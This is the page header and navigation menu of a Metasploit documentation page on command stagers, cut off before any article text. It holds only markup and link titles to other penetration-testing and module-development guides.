<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-4622520-7"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-4622520-7', { 'anonymize_ip': true }); </script> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script><meta name="viewport" content="width=device-width, initial-scale=1"><title>How to use command stagers | Metasploit Documentation Penetration Testing Software, Pen Testing Security</title><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="How to use command stagers" /><meta property="og:locale" content="en_US" /><meta name="description" content="View Metasploit Framework Documentation" /><meta property="og:description" content="View Metasploit Framework Documentation" /><link rel="canonical" href="https://rapid7.github.io/metasploit-framework/docs/development/developing-modules/guides/how-to-use-command-stagers.html" /><meta property="og:url" content="https://rapid7.github.io/metasploit-framework/docs/development/developing-modules/guides/how-to-use-command-stagers.html" /><meta property="og:site_name" content="Metasploit Documentation Penetration Testing Software, Pen Testing Security" /><meta property="og:type" content="website" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="How to use command stagers" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"View Metasploit Framework Documentation","headline":"How to use command stagers","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://rapid7.github.io/metasploit-framework/assets/images/favicon.png"}},"url":"https://rapid7.github.io/metasploit-framework/docs/development/developing-modules/guides/how-to-use-command-stagers.html"}</script><body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"><title>Link</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"><title>Search</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"><title>Menu</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"><title>Expand</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"><polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"><title>Document</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <script type="text/javascript" src="/assets/js/toggle_init.js"></script><div class="side-bar"><div class="site-header"> <a href="/" class="site-title lh-tight"><img src="/assets/images/metasploit-logo-dark-external-use.svg" alt="Metasploit Logo" class="title-logo" /> </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a></div><nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"><ul class="nav-list"><li class="nav-list-item active"><a href="/" class="nav-list-link">Home</a><li class="nav-list-item active"><a href="/docs/code-of-conduct.html" class="nav-list-link">Code Of Conduct</a><li class="nav-list-item active"><a href="/docs/modules.html" class="nav-list-link">Modules</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/" class="nav-list-link">Pentesting</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-setting-module-options.html" class="nav-list-link">Setting Module Options</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html" class="nav-list-link">Upgrading Shells to Meterpreter</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-post-gather-modules.html" class="nav-list-link">Post Gather Modules</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-http.html" class="nav-list-link">HTTP + HTTPS</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-kubernetes.html" class="nav-list-link">Kubernetes</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mysql.html" class="nav-list-link">MySQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-postgresql.html" class="nav-list-link">PostgreSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-smb.html" class="nav-list-link">SMB</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ssh.html" class="nav-list-link">SSH</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-winrm.html" class="nav-list-link">WinRM</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mssql.html" class="nav-list-link">MSSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ldap.html" class="nav-list-link">LDAP</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/" class="nav-list-link">Active Directory</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/ad-certificates/" class="nav-list-link">AD CS</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html" class="nav-list-link">Attacking AD CS ESC Vulnerabilities Using Metasploit</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html" class="nav-list-link">Vulnerable cert finder</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/ad_cs_cert_template.html" class="nav-list-link">Manage certificate templates</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/icpr_cert.html" class="nav-list-link">Request certificates</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/kerberos/" class="nav-list-link">Kerberos</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/service_authentication.html" class="nav-list-link">Authenticating to SMB/WinRM/etc</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberos_login.html" class="nav-list-link">Kerberos login enumeration and bruteforcing</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/get_ticket.html" class="nav-list-link">Get Ticket granting tickets and service tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/ticket_converter.html" class="nav-list-link">Converting kirbi and ccache files</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/forge_ticket.html" class="nav-list-link">Forging tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/inspect_ticket.html" class="nav-list-link">Inspecting tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberoasting.html" class="nav-list-link">Kerberoasting</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/keytab.html" class="nav-list-link">Keytab support and decrypting wireshark traffic</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/rbcd.html" class="nav-list-link">Resource-based constrained delegation (RBCD)</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/unconstrained_delegation.html" class="nav-list-link">Unconstrained delegation</a></ul></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/" class="nav-list-link">Using Metasploit</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/getting-started/" class="nav-list-link">Getting Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/nightly-installers.html" class="nav-list-link">Nightly Installers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/reporting-a-bug.html" class="nav-list-link">Reporting a Bug</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/basics/" class="nav-list-link">Basics</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/using-metasploit.html" class="nav-list-link">Running modules</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html" class="nav-list-link">How to use a Metasploit module appropriately</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-payloads-work.html" class="nav-list-link">How payloads work</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/module-documentation.html" class="nav-list-link">Module Documentation</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html" class="nav-list-link">How to use a reverse shell in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-msfvenom.html" class="nav-list-link">How to use msfvenom</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/managing-sessions.html" class="nav-list-link">Managing Sessions</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/intermediate/" class="nav-list-link">Intermediate</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/metasploit-database-support.html" class="nav-list-link">Database Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/evading-anti-virus.html" class="nav-list-link">Evading Anti Virus</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/exploit-ranking.html" class="nav-list-link">Exploit Ranking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/hashes-and-password-cracking.html" class="nav-list-link">Hashes and Password Cracking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/how-to-use-plugins.html" class="nav-list-link">Metasploit Plugins</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/payload-uuid.html" class="nav-list-link">Payload UUID</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/pivoting-in-metasploit.html" class="nav-list-link">Pivoting in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/running-private-modules.html" class="nav-list-link">Running Private Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/" class="nav-list-link">Advanced</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/how-to-configure-dns.html" class="nav-list-link">How to Configure DNS</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/metasploit-web-service.html" class="nav-list-link">Metasploit Web Service</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/meterpreter/" class="nav-list-link">Meterpreter</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html" class="nav-list-link">Configuration</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html" class="nav-list-link">Debugging Dead Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-debugging-meterpreter-sessions.html" class="nav-list-link">Debugging Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html" class="nav-list-link">ExecuteBof Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-http-communication.html" class="nav-list-link">HTTP Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/how-to-get-started-with-writing-a-meterpreter-script.html" class="nav-list-link">How to get started with writing a Meterpreter script</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html" class="nav-list-link">Paranoid Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/powershell-extension.html" class="nav-list-link">Powershell Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/python-extension.html" class="nav-list-link">Python Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reg-command.html" class="nav-list-link">Reg Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html" class="nav-list-link">Reliable Network Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html" class="nav-list-link">Sleep Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html" class="nav-list-link">Stageless Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html" class="nav-list-link">The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html" class="nav-list-link">Timeout Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html" class="nav-list-link">Transport Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-unicode-support.html" class="nav-list-link">Unicode Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-wishlist.html" class="nav-list-link">Wishlist</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/RPC/" class="nav-list-link">RPC</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-json-rpc.html" class="nav-list-link">How to use Metasploit JSON RPC</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-messagepack-rpc.html" class="nav-list-link">How to use Metasploit Messagepack RPC</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/" class="nav-list-link">Other</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/how-to-use-metasploit-with-ngrok.html" class="nav-list-link">How to use Metasploit with ngrok</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/how-to-use-the-favorite-command.html" class="nav-list-link">How to use the Favorite command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/information-about-unmet-browser-exploit-requirements.html" class="nav-list-link">Information About Unmet Browser Exploit Requirements</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/oracle-support/" class="nav-list-link">Oracle Support</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html" class="nav-list-link">How to get Oracle Support working with Kali Linux</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/oracle-usage.html" class="nav-list-link">Oracle Usage</a></ul><li class="nav-list-item active"><a href="/docs/using-metasploit/other/why-cve-is-not-available.html" class="nav-list-link">Why CVE is not available</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/" class="nav-list-link active">Development</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/" class="nav-list-link">Get Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/contributing-to-metasploit.html" class="nav-list-link">Contributing to Metasploit</a><li class="nav-list-item active"><a href="/docs/development/get-started/creating-your-first-pr.html" class="nav-list-link">Creating Your First PR</a><li class="nav-list-item active"><a href="/docs/development/get-started/setting-up-a-metasploit-development-environment.html" class="nav-list-link">Setting Up a Metasploit Development Environment</a><li class="nav-list-item active"><a href="/docs/development/get-started/sanitizing-pcaps.html" class="nav-list-link">Sanitizing PCAPs</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/git/" class="nav-list-link">Git</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-reference-sites.html" class="nav-list-link">Git Reference Sites</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-cheatsheet.html" class="nav-list-link">Git cheatsheet</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html" class="nav-list-link">Keeping in sync with rapid7 master</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/remote-branch-pruning.html" class="nav-list-link">Remote Branch Pruning</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/using-git.html" class="nav-list-link">Using Git</a></ul><li class="nav-list-item active"><a href="/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html" class="nav-list-link">Navigating the codebase</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/" class="nav-list-link active">Developing Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/" class="nav-list-link active">Guides</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/scanners/" class="nav-list-link">Scanners</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html" class="nav-list-link">Writing a HTTP LoginScanner</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html" class="nav-list-link">Writing an FTP LoginScanner</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html" class="nav-list-link">How to check Microsoft patch levels for your exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html" class="nav-list-link">How to use Fetch Payloads</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-use-command-stagers.html" class="nav-list-link active">How to use command stagers</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-check-method.html" class="nav-list-link">How to write a check method</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-cmd-injection-module.html" class="nav-list-link">How to write a cmd injection module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html" class="nav-list-link">Writing a browser exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html" class="nav-list-link">Writing a post module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html" class="nav-list-link">Writing an auxiliary module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/get-started-writing-an-exploit.html" class="nav-list-link">Writing an exploit</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/external-modules/" class="nav-list-link">External Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-golang-modules.html" class="nav-list-link">Writing GoLang Modules</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-python-modules.html" class="nav-list-link">Writing Python Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/module-metadata/" class="nav-list-link">Module metadata</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html" class="nav-list-link">Definition of Module Reliability Side Effects and Stability</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html" class="nav-list-link">How to use datastore options</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/module-reference-identifiers.html" class="nav-list-link">Module Reference Identifiers</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/" class="nav-list-link">Libraries</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/api.html" class="nav-list-link">API</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html" class="nav-list-link">AuthBrute</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-cleanup-after-module-execution.html" class="nav-list-link">Cleanup</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/c/" class="nav-list-link">Compiling C</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html" class="nav-list-link">Base64 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html" class="nav-list-link">RC4 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html" class="nav-list-link">XOR Support</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/deserialization/" class="nav-list-link">Deserialization</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html" class="nav-list-link">Dot Net Deserialization</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html" class="nav-list-link">Java Deserialization</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html" class="nav-list-link">Fail_with</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-fileformat-mixin-to-create-a-file-format-exploit.html" class="nav-list-link">Fileformat</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-git-mixin-to-write-an-exploit-module.html" class="nav-list-link">Git Mixin</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/http/" class="nav-list-link">HTTP</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-browser-exploit-using-browserexploitserver.html" class="nav-list-link">BrowserExploitServer</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html" class="nav-list-link">How to Send an HTTP Request Using HttpClient</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html" class="nav-list-link">How to parse an HTTP response</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html" class="nav-list-link">How to send an HTTP request using Rex Proto Http Client</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-module-using-httpserver-and-httpclient.html" class="nav-list-link">How to write a module using HttpServer and HttpClient</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html" class="nav-list-link">Logging</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/obfuscation/" class="nav-list-link">Obfuscation</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html" class="nav-list-link">C Obfuscation</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html" class="nav-list-link">JavaScript Obfuscation</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-phpexe-to-exploit-an-arbitrary-file-upload-bug.html" class="nav-list-link">PhpExe</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-powershell-in-an-exploit.html" class="nav-list-link">Powershell</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html" class="nav-list-link">Railgun</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/using-reflectivedll-injection.html" class="nav-list-link">ReflectiveDLL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-do-reporting-or-store-data-in-module-development.html" class="nav-list-link">Reporting and Storing Data</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-seh-mixin-to-exploit-an-exception-handler.html" class="nav-list-link">SEH Exploitation</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/smb_library/" class="nav-list-link">SMB Library</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/guidelines-for-writing-modules-with-smb.html" class="nav-list-link">Guidelines for Writing Modules with SMB</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/what-my-rex-proto-smb-error-means.html" class="nav-list-link">What my Rex Proto SMB Error means</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/sql-injection-libraries.html" class="nav-list-link">SQL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html" class="nav-list-link">TCP</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-wbemexec-for-a-write-privilege-attack-on-windows.html" class="nav-list-link">WbemExec</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html" class="nav-list-link">Zip</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/google-summer-of-code/" class="nav-list-link">Google Summer of Code</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-mentor-organization-application.html" class="nav-list-link">2017 Mentor Organization Application</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html" class="nav-list-link">2017 Project Ideas</a><li 